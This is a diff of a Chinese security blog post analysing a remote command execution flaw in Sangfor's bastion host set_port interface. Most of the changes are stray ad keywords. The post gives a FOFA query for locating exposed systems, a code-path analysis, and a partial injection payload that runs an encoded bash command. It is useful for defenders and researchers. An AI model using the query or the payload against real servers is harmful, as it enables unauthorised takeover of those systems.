@@ -7,17 +7,17 @@ asset_dir: assets/深信服运维安全管理系统-set_port-远程命令执行�
 # 深信服运维安全管理系统 set\_port 远程命令执行漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/11/19 09:20
-- 1022浏览
+- 1024浏览
 - [0评论](#comment)
 - 29分钟阅读
 
 深入探索
 
-firewall
-
 软件
 
-服务器
+防火墙
+
+firewall
 
 ---
 
@@ -25,7 +25,7 @@ firewall
 
 深信服运维安全管理系统 set\_port 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。
 
-安全工具开发
+文件大小转换
 
 # 影响版本
 
@@ -34,8 +34,6 @@ firewall
 # fofa语法
 
 > body="/fort/login" && header="FORTSESSIONID"
->
-> 漏洞预警服务
 
 # 漏洞分析
 
@@ -45,25 +43,27 @@ firewall
 
 两个参数**select**与**Unselect**被带入**setPort**方法，跟进`setPort`方法看下它的实现逻辑
 
-计算机服务器
+漏洞扫描服务
 
 深入探索
 
-文件大小转换
+云安全解决方案
 
-Nessus
+技术文章订阅
 
-恶意软件分析工具
+在线安全工具
 
 [![深信服运维安全管理系统 set_port 远程命令执行漏洞](images/img-002-bb4b3bbf7f57.webp)](https://image.mrxn.net/6f1880b419b5470eab3baeb4d5bfd8ae.webp)
 
 首先将`selectedPort`即参数**select直接写入`/usr/local/bin/sh/firewall.sh`** 脚本文件里，然后再将两个参数的值按照逗号分割后，分别拼接进iptables语句中，然后写入`/usr/local/bin/sh/firewall.sh` 脚本文件里，
 
-漏洞预警服务
+计算机服务器
 
 [![深信服运维安全管理系统 set_port 远程命令执行漏洞](images/img-003-60f95ecb796e.webp)](https://image.mrxn.net/e2f29cae80f64a0b9950a8ebb8b7ec04.webp)
 
 然后调用`ShellExecutor`类的`exe`方法进行执行shell脚本，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞（两个参数均存在命令执行漏洞）。
+
+漏洞扫描服务
 
 # 漏洞复现
 
@@ -87,7 +87,7 @@ select=6379+-j+DROP%0a%62%61%73%68%20%2d%63%20%24%28%65%63%68%6f%20%5a%57%4e%6f%
 
 成功[执行命令](https://mrxn.net/tag/rce)，并删除自身
 
-漏洞预警服务
+漏洞扫描服务
 
 # 参考
 
